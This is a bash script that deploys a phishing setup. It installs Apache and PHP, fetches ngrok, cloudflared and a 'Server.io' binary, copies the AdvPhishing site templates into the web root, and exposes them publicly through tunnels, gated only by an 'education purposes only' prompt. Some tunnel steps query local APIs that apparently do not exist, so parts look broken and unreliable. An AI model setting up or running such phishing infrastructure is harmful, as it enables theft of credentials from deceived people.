######################################################################################################################################################################################################################
# Bash script for phishing framework. Note: API key is not integrated, due to potential security implacations to ngrok, and you'll have to sign up with ngrok for an API key.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

#!/bin/bash

# Function to display the educational usage prompt
educational_prompt() {
  echo -e "\e[1;31m\e[1mUse for education purposes only. Do you agree? (yes/no)\e[0m"
  read -r USER_RESPONSE
  if [ "$USER_RESPONSE" != "yes" ]; then
    echo -e "\e[1;31mExiting script. Please use the script for educational purposes only.\e[0m"
    exit 0
  fi
}

# Function to install necessary packages
install_packages() {
  echo "Installing necessary packages..."
  apt-get update
  apt-get install -y apache2 php unzip jq git curl
  echo "Packages installed."
}

# Function to set up ngrok with API key
setup_ngrok() {
  echo "Setting up ngrok..."
  if [ ! -f "/usr/local/bin/ngrok" ]; then
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
    unzip ngrok.zip
    chmod +x ngrok
    mv ngrok /usr/local/bin
    rm ngrok.zip
  else
    echo "Ngrok is already set up."
  fi

  # Check if ngrok authtoken is already configured
  if [ ! -f "$HOME/.ngrok2/ngrok.yml" ]; then
    echo -n "Enter your ngrok authtoken: "
    read -r NGROK_AUTHTOKEN

    mkdir -p "$HOME/.ngrok2"
    echo "authtoken: $NGROK_AUTHTOKEN" > "$HOME/.ngrok2/ngrok.yml"
  else
    echo "Ngrok authtoken is already configured."
  fi

  echo "Ngrok setup complete."
}

# Function to set up Cloudflared
setup_cloudflared() {
  echo "Setting up Cloudflared..."
  if [ ! -f "/usr/local/bin/cloudflared" ]; then
    wget https://github.com/cloudflare/cloudflared/releases/download/2023.11.2/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
    mv cloudflared /usr/local/bin
  else
    echo "Cloudflared is already set up."
  fi

  echo "Cloudflared setup complete."
}

# Function to set up Server.io
setup_serverio() {
  echo "Setting up Server.io..."
  if [ ! -f "/usr/local/bin/server" ]; then
    wget https://github.com/serverio/server/releases/download/v1.2.3/server-linux-amd64 -O server
    chmod +x server
    mv server /usr/local/bin
  else
    echo "Server.io is already set up."
  fi

  echo "Server.io setup complete."
}

# Function to clone ADVPhishing templates (Thank you ADVPhishing team!)
clone_templates() {
  echo "Cloning ADVPhishing templates..."
  if [ ! -d "AdvPhishing" ]; then
    git clone https://github.com/Ignitetch/AdvPhishing.git
  else
    echo "ADVPhishing repository already exists."
  fi
  if [ ! -d "/var/www/html/phishing" ]; then
    mkdir -p /var/www/html/phishing
    cp -r AdvPhishing/sites/* /var/www/html/phishing/
  else
    echo "Phishing templates already copied."
  fi
  echo "Templates cloned."
}

# Function to start ngrok
start_ngrok() {
  echo "Starting ngrok..."
  ngrok http 80 --config "$HOME/.ngrok2/ngrok.yml" > /dev/null &
  sleep 45  # Increased wait time for ngrok to fully start

  # Loop to wait for the ngrok URL to be available
  while true; do
    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)
    if [[ "$NGROK_URL" != "null" ]]; then
      break
    fi
    sleep 1
  done

  if [ -z "$NGROK_URL" ]; then
    echo "Failed to retrieve ngrok URL. Debugging information:"
    curl -s http://127.0.0.1:4040/api/tunnels
    exit 1
  else
    echo -e "\e[1;33m\e[1mNgrok URL: $NGROK_URL\e[0m"
  fi
}

# Function to start Cloudflared
start_cloudflared() {
  echo "Starting Cloudflared..."
  cloudflared tunnel --url http://127.0.0.1:80 &> /dev/null &
  sleep 45  # Increased wait time for Cloudflared to fully start

  # Check if Cloudflared tunnel is running
  TUNNEL_URL=$(curl -s http://localhost:4000/api/tunnels | jq -r .tunnels[0].public_url)
  if [ -z "$TUNNEL_URL" ]; then
    echo "Failed to retrieve Cloudflared URL."
    exit 1
  else
    echo -e "\e[1;33m\e[1mCloudflared URL: $TUNNEL_URL\e[0m"
  fi
}

# Function to start Server.io
start_serverio() {
  echo "Starting Server.io..."
  server -f http://127.0.0.1:80 &> /dev/null &
  sleep 45  # Wait time for Server.io to establish connection

  # Check if Server.io tunnel is running
  SERVER_URL=$(curl -s http://localhost:5000/api/tunnels | jq -r .tunnels[0].public_url)
  if [ -z "$SERVER_URL" ]; then
    echo "Failed to retrieve Server.io URL."
    exit 1
  else
    echo -e "\e[1;33m\e[1mServer.io URL: $SERVER_URL\e[0m"
  fi
}

# Function to start Apache server
start_server() {
  echo "Starting Apache server..."
  service apache2 start
  echo "Apache server started."
}

# Function to handle graceful shutdown
shutdown() {
  echo "Shutting down..."
  pkill -f ngrok
  pkill -f cloudflared
  pkill -f server
  service apache2 stop
  echo "Shutdown complete."
  exit 0
}

# Function to generate a random 5-digit PIN
generate_pin() {
  PIN=$(shuf -i 10000-99999 -n 1)
  echo "Generated PIN: $PIN"
}

# Function to prompt for 5-digit PIN
prompt_pin() {
  read -sp "Enter the 5-digit PIN to proceed: " INPUT_PIN
  echo ""
  if [ "$INPUT_PIN" != "$PIN" ]; then
    echo "Invalid PIN. Please enter the correct 5-digit PIN."
    prompt_pin
  fi
}

# Trap CTRL-C to gracefully shutdown
trap shutdown INT

# Main script execution
educational_prompt
install_packages
setup_ngrok
setup_cloudflared
setup_serverio

# Generate and prompt for PIN before starting tunnels
generate_pin
prompt_pin

# Start tunnels
start_ngrok
start_cloudflared
start_serverio

# Clone templates and start Apache server after tunnels are running
clone_templates
start_server

# Keep the script running
while true; do
  sleep 1
done
